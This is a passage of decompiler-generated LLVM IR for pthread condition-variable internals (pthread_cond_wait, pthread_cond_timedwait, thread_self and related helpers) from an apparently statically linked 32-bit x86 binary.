  store i32 %arg1, i32* @eax, align 4
  %v1_8058ec3 = call i32 @__pthread_lock(i32 %v0_8058eb7)
  %v0_8058ecb = load i32, i32* @ebx, align 4
  %v1_8058ecb = add i32 %v0_8058ecb, 8
  %v2_8058ecb = inttoptr i32 %v1_8058ecb to i32*
  %v3_8058ecb = load i32, i32* %v2_8058ecb, align 4
  store i32 %v3_8058ecb, i32* @esi, align 4
  store i32 0, i32* %v2_8058ecb, align 4
  %v0_8058ed5 = load i32, i32* @ebx, align 4
  %v1_8058ed6 = inttoptr i32 %v0_8058ed5 to i32*
  %v2_8058ed6 = call i32 @__pthread_unlock(i32* %v1_8058ed6)
  %v0_8058efa1 = load i32, i32* @esi, align 4
  %v1_8058efa2 = icmp eq i32 %v0_8058efa1, 0
  %v1_8058efc9 = icmp eq i1 %v1_8058efa2, false
  br i1 %v1_8058efc9, label %dec_label_pc_8058ee0, label %dec_label_pc_8058efe

dec_label_pc_8058ee0:                             ; preds = %entry, %dec_label_pc_8058ee0
  %v0_8058ee0 = phi i32 [ %v0_8058efa, %dec_label_pc_8058ee0 ], [ %v0_8058efa1, %entry ]
  %v1_8058ee0 = add i32 %v0_8058ee0, 8
  %v2_8058ee0 = inttoptr i32 %v1_8058ee0 to i32*
  %v3_8058ee0 = load i32, i32* %v2_8058ee0, align 4
  store i32 %v3_8058ee0, i32* @ebx, align 4
  %v1_8058ee3 = add i32 %v0_8058ee0, 441
  %v2_8058ee3 = inttoptr i32 %v1_8058ee3 to i8*
  store i8 1, i8* %v2_8058ee3, align 1
  %v0_8058eea = load i32, i32* @esi, align 4
  %v1_8058eea = add i32 %v0_8058eea, 8
  %v2_8058eea = inttoptr i32 %v1_8058eea to i32*
  store i32 0, i32* %v2_8058eea, align 4
  %v0_8058ef1 = load i32, i32* @esi, align 4
  store i32 %v0_8058ef1, i32* @eax, align 4
  %v0_8058ef3 = load i32, i32* @ebx, align 4
  store i32 %v0_8058ef3, i32* @esi, align 4
  %v0_8058ef5 = call i32 @restart.16()
  %v0_8058efa = load i32, i32* @esi, align 4
  %v1_8058efa = icmp eq i32 %v0_8058efa, 0
  %v1_8058efc = icmp eq i1 %v1_8058efa, false
  br i1 %v1_8058efc, label %dec_label_pc_8058ee0, label %dec_label_pc_8058efe

dec_label_pc_8058efe:                             ; preds = %dec_label_pc_8058ee0, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_8058efa, { 1, 0 }
  uselistorder i32 %v0_8058ee0, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8058ee0, { 1, 0 }
}

define i32 @thread_self.17(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_8058f0b = load i32, i32* @esp, align 4
  %v1_8058f0b = load i32, i32* @global_var_807a620.650, align 32
  %v7_8058f0b = icmp ult i32 %v0_8058f0b, %v1_8058f0b
  %v1_8058f11 = icmp eq i1 %v7_8058f0b, false
  br i1 %v1_8058f11, label %dec_label_pc_8058f42, label %dec_label_pc_8058f13

dec_label_pc_8058f13:                             ; preds = %entry
  %v1_8058f13 = load i32, i32* @global_var_807a624.651, align 4
  %v7_8058f13 = icmp ult i32 %v0_8058f0b, %v1_8058f13
  br i1 %v7_8058f13, label %dec_label_pc_8058f28, label %dec_label_pc_8058f1b

dec_label_pc_8058f1b:                             ; preds = %dec_label_pc_8058f13
  %v1_8058f20 = load i32, i32* @global_var_807a628.653, align 8
  %v7_8058f20 = icmp ult i32 %v0_8058f0b, %v1_8058f20
  br i1 %v7_8058f20, label %dec_label_pc_8058f42, label %dec_label_pc_8058f28

dec_label_pc_8058f28:                             ; preds = %dec_label_pc_8058f1b, %dec_label_pc_8058f13
  %v0_8058f28 = load i32, i32* @global_var_807e100.654, align 256
  %v1_8058f28 = icmp eq i32 %v0_8058f28, 0
  br i1 %v1_8058f28, label %dec_label_pc_8058f36, label %dec_label_pc_8058f31

dec_label_pc_8058f31:                             ; preds = %dec_label_pc_8058f28
  %v0_8058f31 = call i32 @__pthread_find_self()
  br label %dec_label_pc_8058f36

dec_label_pc_8058f36:                             ; preds = %dec_label_pc_8058f28, %dec_label_pc_8058f31
  %v2_8058f3c = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_8058f42

dec_label_pc_8058f42:                             ; preds = %dec_label_pc_8058f1b, %entry, %dec_label_pc_8058f36
  %v0_8058f42 = phi i32 [ ptrtoint (i32* @global_var_8073aa0.652 to i32), %dec_label_pc_8058f1b ], [ ptrtoint (i32* @global_var_80738c0 to i32), %entry ], [ %v2_8058f3c, %dec_label_pc_8058f36 ]
  ret i32 %v0_8058f42

; uselistorder directives
  uselistorder label %dec_label_pc_8058f42, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8058f36, { 1, 0 }
}

define i32 @cond_extricate_func(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8058f43 = load i32, i32* @esi, align 4
  %v0_8058f44 = load i32, i32* @ebx, align 4
  %v2_8058f48 = call i32 @thread_self.17(i32 %v0_8058f44, i32 %v0_8058f43)
  store i32 %arg1, i32* @ebx, align 4
  store i32 %v2_8058f48, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_8058f5b = call i32 @__pthread_lock(i32 %v2_8058f48)
  store i32 %arg2, i32* @edx, align 4
  %v0_8058f64 = load i32, i32* @ebx, align 4
  %v1_8058f64 = add i32 %v0_8058f64, 8
  store i32 %v1_8058f64, i32* @eax, align 4
  %v0_8058f67 = call i32 @remove_from_queue.14()
  store i32 %v0_8058f67, i32* @esi, align 4
  %v0_8058f71 = load i32, i32* @ebx, align 4
  %v1_8058f72 = inttoptr i32 %v0_8058f71 to i32*
  %v2_8058f72 = call i32 @__pthread_unlock(i32* %v1_8058f72)
  %v0_8058f77 = load i32, i32* @esi, align 4
  ret i32 %v0_8058f77

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @suspend.18() local_unnamed_addr {
entry:
  %v0_8058f82 = load i32, i32* @eax, align 4
  %v1_8058f83 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_8058f82)
  ret i32 %v1_8058f83

; uselistorder directives
  uselistorder i32 (i32)* @__pthread_wait_for_restart_signal, { 2, 3, 4, 0, 5, 6, 1 }
}

define i32 @__GI_pthread_cond_timedwait(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8058f8e = load i32, i32* @esi, align 4
  %v0_8058f8f = load i32, i32* @ebx, align 4
  store i32 %v0_8058f8f, i32* %stack_var_-16, align 4
  %v4_8058f8f = ptrtoint i32* %stack_var_-16 to i32
  %v2_8058f93 = call i32 @thread_self.17(i32 %v0_8058f8f, i32 %v0_8058f8e)
  store i32 %arg2, i32* @ebp, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_8058fa4 = add i32 %arg2, 12
  %v2_8058fa4 = inttoptr i32 %v1_8058fa4 to i32*
  %v3_8058fa4 = load i32, i32* %v2_8058fa4, align 4
  %v9_8058fa7 = icmp eq i32 %v3_8058fa4, 3
  br i1 %v9_8058fa7, label %dec_label_pc_8058fc2, label %dec_label_pc_8058fac

dec_label_pc_8058fac:                             ; preds = %entry
  %v1_8058fac = icmp eq i32 %v3_8058fa4, 0
  br i1 %v1_8058fac, label %dec_label_pc_8058fc2, label %dec_label_pc_8058fb0

dec_label_pc_8058fb0:                             ; preds = %dec_label_pc_8058fac
  %v1_8058fb9 = add i32 %arg2, 8
  %v2_8058fb9 = inttoptr i32 %v1_8058fb9 to i32*
  %v3_8058fb9 = load i32, i32* %v2_8058fb9, align 4
  %v15_8058fb9 = icmp eq i32 %v3_8058fb9, %v2_8058f93
  %v1_8058fbc = icmp eq i1 %v15_8058fb9, false
  br i1 %v1_8058fbc, label %dec_label_pc_8058fb0.dec_label_pc_8059134_crit_edge, label %dec_label_pc_8058fc2

dec_label_pc_8058fb0.dec_label_pc_8059134_crit_edge: ; preds = %dec_label_pc_8058fb0
  br label %dec_label_pc_8059134

dec_label_pc_8058fc2:                             ; preds = %dec_label_pc_8058fb0, %dec_label_pc_8058fac, %entry
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v2_8058fd2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8058fd2, i32* @edx, align 4
  %v1_8058fd6 = add i32 %v2_8058f93, 441
  %v2_8058fd6 = inttoptr i32 %v1_8058fd6 to i8*
  store i8 0, i8* %v2_8058fd6, align 1
  store i32 %v2_8058f93, i32* @eax, align 4
  %v0_8058fe1 = load i32, i32* %stack_var_-28, align 4
  %v2_8058fe1 = call i32 @__pthread_set_own_extricate_if.15(i32 %v0_8058fe1, i32 134582083)
  %v0_8058fe6 = load i32, i32* @esi, align 4
  store i32 %v0_8058fe6, i32* @eax, align 4
  store i32 %v2_8058f93, i32* @edx, align 4
  %v1_8058fec = call i32 @__pthread_lock(i32 134582083)
  %v1_8058ff5 = add i32 %v2_8058f93, 66
  %v2_8058ff5 = inttoptr i32 %v1_8058ff5 to i8*
  %v3_8058ff5 = load i8, i8* %v2_8058ff5, align 1
  %v4_8058ff5 = icmp eq i8 %v3_8058ff5, 0
  br i1 %v4_8058ff5, label %dec_label_pc_805900a, label %dec_label_pc_8058ffb

dec_label_pc_8058ffb:                             ; preds = %dec_label_pc_8058fc2
  store i32 1, i32* @ebx, align 4
  %v1_8059004 = add i32 %v2_8058f93, 64
  %v2_8059004 = inttoptr i32 %v1_8059004 to i8*
  %v3_8059004 = load i8, i8* %v2_8059004, align 1
  %v4_8059004 = icmp eq i8 %v3_8059004, 0
  br i1 %v4_8059004, label %dec_label_pc_8059018, label %dec_label_pc_805900a

dec_label_pc_805900a:                             ; preds = %dec_label_pc_8058ffb, %dec_label_pc_8058fc2
  store i32 %v2_8058f93, i32* @edx, align 4
  %v0_8059011 = call i32 @enqueue.13()
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8059018

dec_label_pc_8059018:                             ; preds = %dec_label_pc_8058ffb, %dec_label_pc_805900a
  %v0_805901b = load i32, i32* @esi, align 4
  store i32 %v0_805901b, i32* %stack_var_-60, align 4
  %v1_805901c = inttoptr i32 %v0_805901b to i32*
  %v2_805901c = call i32 @__pthread_unlock(i32* %v1_805901c)
  %v0_8059024 = load i32, i32* @ebx, align 4
  %v1_8059024 = icmp eq i32 %v0_8059024, 0
  br i1 %v1_8059024, label %dec_label_pc_805903a, label %dec_label_pc_8059028

dec_label_pc_8059028:                             ; preds = %dec_label_pc_8059018
  store i32 %v2_8058f93, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_805902e = load i32, i32* %stack_var_-60, align 4
  %v1_805902e = load i32, i32* %stack_var_-56, align 4
  %v2_805902e = call i32 @__pthread_set_own_extricate_if.15(i32 %v0_805902e, i32 %v1_805902e)
  br label %dec_label_pc_80590f0

dec_label_pc_805903a:                             ; preds = %dec_label_pc_8059018
  store i32 0, i32* @edi, align 4
  %v0_805903f = load i32, i32* @ebp, align 4
  store i32 %v0_805903f, i32* %stack_var_-60, align 4
  %v1_8059040 = call i32 @pthread_mutex_unlock(i32 %v0_805903f)
  %v3_8059053 = inttoptr i32 %arg3 to i32*
  %v1_80590a2 = add i32 %v2_8058f93, 440
  %v2_80590a2 = inttoptr i32 %v1_80590a2 to i8*
  %v1_80590af = add i32 %v2_8058f93, 64
  %v2_80590af = inttoptr i32 %v1_80590af to i8*
  br label %dec_label_pc_8059048

dec_label_pc_8059048:                             ; preds = %dec_label_pc_80590b5, %dec_label_pc_805903a
  %v0_805904c = load i32, i32* @edx, align 4
  store i32 %arg3, i32* %stack_var_-56, align 4
  store i32 %v2_8058f93, i32* %stack_var_-60, align 4
  %v4_8059053 = call i32 @__pthread_timedsuspend_new(i32 %v2_8058f93, i32* %v3_8059053, i32 %v0_805904c)
  %v1_805905b = icmp eq i32 %v4_8059053, 0
  %v1_805905d = icmp eq i1 %v1_805905b, false
  br i1 %v1_805905d, label %dec_label_pc_8059091, label %dec_label_pc_805905f

dec_label_pc_805905f:                             ; preds = %dec_label_pc_8059048
  store i32 %v2_8058f93, i32* @edx, align 4
  %v0_8059063 = load i32, i32* @esi, align 4
  store i32 %v0_8059063, i32* @eax, align 4
  %v0_8059065 = load i32, i32* %stack_var_-60, align 4
  %v1_8059065 = call i32 @__pthread_lock(i32 %v0_8059065)
  store i32 %v2_8058f93, i32* @edx, align 4
  %v0_805906e = load i32, i32* @esi, align 4
  %v1_805906e = add i32 %v0_805906e, 8
  store i32 %v1_805906e, i32* @eax, align 4
  %v0_8059071 = call i32 @remove_from_queue.14()
  store i32 %v0_8059071, i32* @ebx, align 4
  %v0_805907b = load i32, i32* @esi, align 4
  store i32 %v0_805907b, i32* %stack_var_-60, align 4
  %v1_805907c = inttoptr i32 %v0_805907b to i32*
  %v2_805907c = call i32 @__pthread_unlock(i32* %v1_805907c)
  %v1_8059084 = icmp eq i32 %v0_8059071, 0
  %v1_8059086 = icmp eq i1 %v1_8059084, false
  br i1 %v1_8059086, label %dec_label_pc_80590fc, label %dec_label_pc_8059088

dec_label_pc_8059088:                             ; preds = %dec_label_pc_805905f
  store i32 %v2_8058f93, i32* @eax, align 4
  %v0_805908c = call i32 @suspend.18()
  br label %dec_label_pc_8059091

dec_label_pc_8059091:                             ; preds = %dec_label_pc_8059048, %dec_label_pc_8059088
  %v3_8059095 = load i8, i8* %v2_8058fd6, align 1
  %v4_8059095 = icmp eq i8 %v3_8059095, 0
  %v1_805909c = icmp eq i1 %v4_8059095, false
  br i1 %v1_805909c, label %dec_label_pc_80590b8, label %dec_label_pc_805909e

dec_label_pc_805909e:                             ; preds = %dec_label_pc_8059091
  %v3_80590a2 = load i8, i8* %v2_80590a2, align 1
  %v4_80590a2 = icmp eq i8 %v3_80590a2, 0
  br i1 %v4_80590a2, label %dec_label_pc_80590b5, label %dec_label_pc_80590ab

dec_label_pc_80590ab:                             ; preds = %dec_label_pc_805909e
  %v3_80590af = load i8, i8* %v2_80590af, align 1
  %v4_80590af = icmp eq i8 %v3_80590af, 0
  br i1 %v4_80590af, label %dec_label_pc_80590b8, label %dec_label_pc_80590b5

dec_label_pc_80590b5:                             ; preds = %dec_label_pc_80590ab, %dec_label_pc_805909e
  %v0_80590b5 = load i32, i32* @edi, align 4
  %v1_80590b5 = add i32 %v0_80590b5, 1
  store i32 %v1_80590b5, i32* @edi, align 4
  br label %dec_label_pc_8059048

dec_label_pc_80590b8:                             ; preds = %dec_label_pc_80590ab, %dec_label_pc_8059091
  store i32 %v2_8058f93, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_80590be = load i32, i32* %stack_var_-60, align 4
  %v1_80590be = load i32, i32* %stack_var_-56, align 4
  %v2_80590be = call i32 @__pthread_set_own_extricate_if.15(i32 %v0_80590be, i32 %v1_80590be)
  %v3_80590c7 = load i8, i8* %v2_80590a2, align 1
  %v4_80590c7 = icmp eq i8 %v3_80590c7, 0
  br i1 %v4_80590c7, label %dec_label_pc_8059120.preheader, label %dec_label_pc_80590d0

dec_label_pc_80590d0:                             ; preds = %dec_label_pc_80590b8
  %v3_80590d4 = load i8, i8* %v2_80590af, align 1
  %v4_80590d4 = icmp eq i8 %v3_80590d4, 0
  %v1_80590d8 = icmp eq i1 %v4_80590d4, false
  br i1 %v1_80590d8, label %dec_label_pc_8059120.preheader, label %dec_label_pc_80590da

dec_label_pc_8059120.preheader:                   ; preds = %dec_label_pc_80590b8, %dec_label_pc_80590d0
  %v0_805912019 = load i32, i32* @edi, align 4
  %v1_805912020 = add i32 %v0_805912019, -1
  store i32 %v1_805912020, i32* @edi, align 4
  %v10_805912126 = icmp eq i32 %v0_805912019, 0
  %v1_805912427 = icmp eq i1 %v10_805912126, false
  br i1 %v1_805912427, label %dec_label_pc_8059117, label %dec_label_pc_8059126

dec_label_pc_80590da:                             ; preds = %dec_label_pc_80590d0
  store i8 0, i8* %v2_80590a2, align 1
  %v0_80590e8 = load i32, i32* @ebp, align 4
  store i32 %v0_80590e8, i32* %stack_var_-60, align 4
  %v1_80590e9 = call i32 @pthread_mutex_lock(i32 %v0_80590e8)
  store i32 %v0_80590e8, i32* @ecx, align 4
  %v2_80590ef = load i32, i32* %stack_var_-56, align 4
  store i32 %v2_80590ef, i32* @ebx, align 4
  br label %dec_label_pc_80590f0

dec_label_pc_80590f0:                             ; preds = %dec_label_pc_8059028, %dec_label_pc_80590da
  store i32 %v4_8058f8f, i32* %stack_var_-56, align 4
  store i32 -1, i32* %stack_var_-60, align 4
  %v2_80590f7 = call i32 @__pthread_do_exit(i32 -1, i32 %v4_8058f8f)
  br label %dec_label_pc_80590fc

dec_label_pc_80590fc:                             ; preds = %dec_label_pc_805905f, %dec_label_pc_80590f0
  store i32 %v2_8058f93, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_8059102 = load i32, i32* %stack_var_-60, align 4
  %v1_8059102 = load i32, i32* %stack_var_-56, align 4
  %v2_8059102 = call i32 @__pthread_set_own_extricate_if.15(i32 %v0_8059102, i32 %v1_8059102)
  %v0_805910a = load i32, i32* @ebp, align 4
  store i32 %v0_805910a, i32* %stack_var_-60, align 4
  %v1_805910b = call i32 @pthread_mutex_lock(i32 %v0_805910a)
  br label %dec_label_pc_8059131

dec_label_pc_8059117:                             ; preds = %dec_label_pc_8059120.preheader, %dec_label_pc_8059117
  store i32 %v2_8058f93, i32* @eax, align 4
  %v0_805911b = call i32 @restart.16()
  %v0_8059120 = load i32, i32* @edi, align 4
  %v1_8059120 = add i32 %v0_8059120, -1
  store i32 %v1_8059120, i32* @edi, align 4
  %v10_8059121 = icmp eq i32 %v0_8059120, 0
  %v1_8059124 = icmp eq i1 %v10_8059121, false
  br i1 %v1_8059124, label %dec_label_pc_8059117, label %dec_label_pc_8059126

dec_label_pc_8059126:                             ; preds = %dec_label_pc_8059117, %dec_label_pc_8059120.preheader
  %v0_8059129 = load i32, i32* @ebp, align 4
  store i32 %v0_8059129, i32* %stack_var_-60, align 4
  %v1_805912a = call i32 @pthread_mutex_lock(i32 %v0_8059129)
  br label %dec_label_pc_8059131

dec_label_pc_8059131:                             ; preds = %dec_label_pc_80590fc, %dec_label_pc_8059126
  %storemerge1 = phi i32 [ 110, %dec_label_pc_80590fc ], [ 0, %dec_label_pc_8059126 ]
  br label %dec_label_pc_8059134

dec_label_pc_8059134:                             ; preds = %dec_label_pc_8058fb0.dec_label_pc_8059134_crit_edge, %dec_label_pc_8059131
  %v0_8059137 = phi i32 [ 22, %dec_label_pc_8058fb0.dec_label_pc_8059134_crit_edge ], [ %storemerge1, %dec_label_pc_8059131 ]
  ret i32 %v0_8059137

; uselistorder directives
  uselistorder i32 %v0_8059071, { 1, 0 }
  uselistorder i32 %v3_8058fa4, { 1, 0 }
  uselistorder i32 %v2_8058f93, { 11, 10, 12, 5, 6, 7, 2, 1, 8, 9, 4, 13, 3, 14, 15, 16, 17, 0 }
  uselistorder i32 %v4_8058f8f, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %stack_var_-56, { 0, 3, 4, 1, 5, 2 }
  uselistorder i32* %stack_var_-60, { 4, 5, 0, 6, 7, 1, 8, 3, 9, 10, 2, 11 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8059134, { 1, 0 }
  uselistorder label %dec_label_pc_8059131, { 1, 0 }
  uselistorder label %dec_label_pc_8059117, { 1, 0 }
  uselistorder label %dec_label_pc_80590fc, { 1, 0 }
  uselistorder label %dec_label_pc_80590f0, { 1, 0 }
  uselistorder label %dec_label_pc_8059120.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8059091, { 1, 0 }
  uselistorder label %dec_label_pc_8059018, { 1, 0 }
}

define i32 @__GI_pthread_cond_wait(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8059141 = load i32, i32* @edi, align 4
  %v0_8059142 = load i32, i32* @esi, align 4
  %v0_8059143 = load i32, i32* @ebx, align 4
  store i32 %v0_8059143, i32* %stack_var_-16, align 4
  %v4_8059143 = ptrtoint i32* %stack_var_-16 to i32
  %v2_8059147 = call i32 @thread_self.17(i32 %v0_8059143, i32 %v0_8059142)
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_8059155 = add i32 %arg2, 12
  %v2_8059155 = inttoptr i32 %v1_8059155 to i32*
  %v3_8059155 = load i32, i32* %v2_8059155, align 4
  %v9_8059158 = icmp eq i32 %v3_8059155, 3
  br i1 %v9_8059158, label %dec_label_pc_8059172, label %dec_label_pc_805915d

dec_label_pc_805915d:                             ; preds = %entry
  %v1_805915d = icmp eq i32 %v3_8059155, 0
  br i1 %v1_805915d, label %dec_label_pc_8059172, label %dec_label_pc_8059161

dec_label_pc_8059161:                             ; preds = %dec_label_pc_805915d
  %v1_8059169 = add i32 %arg2, 8
  %v2_8059169 = inttoptr i32 %v1_8059169 to i32*
  %v3_8059169 = load i32, i32* %v2_8059169, align 4
  %v15_8059169 = icmp eq i32 %v3_8059169, %v2_8059147
  %v1_805916c = icmp eq i1 %v15_8059169, false
  br i1 %v1_805916c, label %dec_label_pc_8059272, label %dec_label_pc_8059172

dec_label_pc_8059172:                             ; preds = %dec_label_pc_8059161, %dec_label_pc_805915d, %entry
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v2_805917f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_805917f, i32* @edx, align 4
  %v1_8059182 = add i32 %v2_8059147, 441
  %v2_8059182 = inttoptr i32 %v1_8059182 to i8*
  store i8 0, i8* %v2_8059182, align 1
  store i32 %v2_8059147, i32* @eax, align 4
  %v0_805918c = load i32, i32* %stack_var_-28, align 4
  %v2_805918c = call i32 @__pthread_set_own_extricate_if.15(i32 %v0_805918c, i32 134582083)
  %v0_8059191 = load i32, i32* @esi, align 4
  store i32 %v0_8059191, i32* @eax, align 4
  store i32 %v2_8059147, i32* @edx, align 4
  %v1_8059196 = call i32 @__pthread_lock(i32 134582083)
  %v1_805919e = add i32 %v2_8059147, 66
  %v2_805919e = inttoptr i32 %v1_805919e to i8*
  %v3_805919e = load i8, i8* %v2_805919e, align 1
  %v4_805919e = icmp eq i8 %v3_805919e, 0
  br i1 %v4_805919e, label %dec_label_pc_80591b2, label %dec_label_pc_80591a4

dec_label_pc_80591a4:                             ; preds = %dec_label_pc_8059172
  store i32 1, i32* @ebx, align 4
  %v1_80591ac = add i32 %v2_8059147, 64
  %v2_80591ac = inttoptr i32 %v1_80591ac to i8*
  %v3_80591ac = load i8, i8* %v2_80591ac, align 1
  %v4_80591ac = icmp eq i8 %v3_80591ac, 0
  br i1 %v4_80591ac, label %dec_label_pc_80591bf, label %dec_label_pc_80591b2

dec_label_pc_80591b2:                             ; preds = %dec_label_pc_80591a4, %dec_label_pc_8059172
  store i32 %v2_8059147, i32* @edx, align 4
  %v0_80591b8 = call i32 @enqueue.13()
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80591bf

dec_label_pc_80591bf:                             ; preds = %dec_label_pc_80591a4, %dec_label_pc_80591b2
  %v0_80591c2 = load i32, i32* @esi, align 4
  store i32 %v0_80591c2, i32* %stack_var_-60, align 4
  %v1_80591c3 = inttoptr i32 %v0_80591c2 to i32*
  %v2_80591c3 = call i32 @__pthread_unlock(i32* %v1_80591c3)
  %v0_80591cb = load i32, i32* @ebx, align 4
  %v1_80591cb = icmp eq i32 %v0_80591cb, 0
  br i1 %v1_80591cb, label %dec_label_pc_80591dd, label %dec_label_pc_80591cf

dec_label_pc_80591cf:                             ; preds = %dec_label_pc_80591bf
  store i32 %v2_8059147, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_80591d4 = load i32, i32* %stack_var_-60, align 4
  %v1_80591d4 = load i32, i32* %stack_var_-56, align 4
  %v2_80591d4 = call i32 @__pthread_set_own_extricate_if.15(i32 %v0_80591d4, i32 %v1_80591d4)
  br label %dec_label_pc_805924b

dec_label_pc_80591dd:                             ; preds = %dec_label_pc_80591bf
  store i32 0, i32* @ebx, align 4
  %v0_80591e2 = load i32, i32* @edi, align 4
  store i32 %v0_80591e2, i32* %stack_var_-60, align 4
  %v1_80591e3 = call i32 @pthread_mutex_unlock(i32 %v0_80591e2)
  %v1_8059202 = add i32 %v2_8059147, 440
  %v2_8059202 = inttoptr i32 %v1_8059202 to i8*
  %v1_805920e = add i32 %v2_8059147, 64
  %v2_805920e = inttoptr i32 %v1_805920e to i8*
  store i32 %v2_8059147, i32* @eax, align 4
  %v0_80591ee16 = call i32 @suspend.18()
  %v3_80591f617 = load i8, i8* %v2_8059182, align 1
  %v4_80591f618 = icmp eq i8 %v3_80591f617, 0
  %v1_80591fd19 = icmp eq i1 %v4_80591f618, false
  br i1 %v1_80591fd19, label %dec_label_pc_8059217, label %dec_label_pc_80591ff

dec_label_pc_80591ff:                             ; preds = %dec_label_pc_80591dd, %dec_label_pc_8059214
  %v3_8059202 = load i8, i8* %v2_8059202, align 1
  %v4_8059202 = icmp eq i8 %v3_8059202, 0
  br i1 %v4_8059202, label %dec_label_pc_8059214, label %dec_label_pc_805920b

dec_label_pc_805920b:                             ; preds = %dec_label_pc_80591ff
  %v3_805920e = load i8, i8* %v2_805920e, align 1
  %v4_805920e = icmp eq i8 %v3_805920e, 0
  br i1 %v4_805920e, label %dec_label_pc_8059217, label %dec_label_pc_8059214

dec_label_pc_8059214:                             ; preds = %dec_label_pc_805920b, %dec_label_pc_80591ff
  %v0_8059214 = load i32, i32* @ebx, align 4
  %v1_8059214 = add i32 %v0_8059214, 1
  store i32 %v1_8059214, i32* @ebx, align 4
  store i32 %v2_8059147, i32* @eax, align 4
  %v0_80591ee = call i32 @suspend.18()
  %v3_80591f6 = load i8, i8* %v2_8059182, align 1
  %v4_80591f6 = icmp eq i8 %v3_80591f6, 0
  %v1_80591fd = icmp eq i1 %v4_80591f6, false
  br i1 %v1_80591fd, label %dec_label_pc_8059217, label %dec_label_pc_80591ff

dec_label_pc_8059217:                             ; preds = %dec_label_pc_8059214, %dec_label_pc_805920b, %dec_label_pc_80591dd
  store i32 %v2_8059147, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_805921c = load i32, i32* %stack_var_-60, align 4
  %v1_805921c = load i32, i32* %stack_var_-56, align 4
  %v2_805921c = call i32 @__pthread_set_own_extricate_if.15(i32 %v0_805921c, i32 %v1_805921c)
  %v3_8059224 = load i8, i8* %v2_8059202, align 1
  %v4_8059224 = icmp eq i8 %v3_8059224, 0
  br i1 %v4_8059224, label %dec_label_pc_805925e, label %dec_label_pc_805922d

dec_label_pc_805922d:                             ; preds = %dec_label_pc_8059217
  %v3_8059230 = load i8, i8* %v2_805920e, align 1
  %v4_8059230 = icmp eq i8 %v3_8059230, 0
  %v1_8059234 = icmp eq i1 %v4_8059230, false
  br i1 %v1_8059234, label %dec_label_pc_805925e, label %dec_label_pc_8059236

dec_label_pc_8059236:                             ; preds = %dec_label_pc_805922d
  store i8 0, i8* %v2_8059202, align 1
  %v0_8059243 = load i32, i32* @edi, align 4
  store i32 %v0_8059243, i32* %stack_var_-60, align 4
  %v1_8059244 = call i32 @pthread_mutex_lock(i32 %v0_8059243)
  store i32 %v0_8059243, i32* @ebx, align 4
  %v2_805924a = load i32, i32* %stack_var_-56, align 4
  store i32 %v2_805924a, i32* @esi, align 4
  br label %dec_label_pc_805924b

dec_label_pc_805924b:                             ; preds = %dec_label_pc_80591cf, %dec_label_pc_8059236
  store i32 %v4_8059143, i32* %stack_var_-56, align 4
  store i32 -1, i32* %stack_var_-60, align 4
  %v2_8059251 = call i32 @__pthread_do_exit(i32 -1, i32 %v4_8059143)
  br label %dec_label_pc_8059256

dec_label_pc_8059256:                             ; preds = %dec_label_pc_805925e, %dec_label_pc_805924b
  store i32 %v2_8059147, i32* @eax, align 4
  %v0_8059259 = call i32 @restart.16()
  br label %dec_label_pc_805925e

dec_label_pc_805925e:                             ; preds = %dec_label_pc_805922d, %dec_label_pc_8059217, %dec_label_pc_8059256
  %v0_805925e = load i32, i32* @ebx, align 4
  %v1_805925e = add i32 %v0_805925e, -1
  store i32 %v1_805925e, i32* @ebx, align 4
  %v10_805925f = icmp eq i32 %v0_805925e, 0
  %v1_8059262 = icmp eq i1 %v10_805925f, false
  br i1 %v1_8059262, label %dec_label_pc_8059256, label %dec_label_pc_8059264

dec_label_pc_8059264:                             ; preds = %dec_label_pc_805925e
  %v0_8059267 = load i32, i32* @edi, align 4
  store i32 %v0_8059267, i32* %stack_var_-60, align 4
  %v1_8059268 = call i32 @pthread_mutex_lock(i32 %v0_8059267)
  br label %dec_label_pc_8059272

dec_label_pc_8059272:                             ; preds = %dec_label_pc_8059161, %dec_label_pc_8059264
  %v0_8059275 = phi i32 [ 22, %dec_label_pc_8059161 ], [ 0, %dec_label_pc_8059264 ]
  %v2_8059277 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8059277, i32* @ebx, align 4
  store i32 %v0_8059142, i32* @esi, align 4
  store i32 %v0_8059141, i32* @edi, align 4
  ret i32 %v0_8059275

; uselistorder directives
  uselistorder i8* %v2_8059182, { 1, 0, 2 }
  uselistorder i32 %v3_8059155, { 1, 0 }
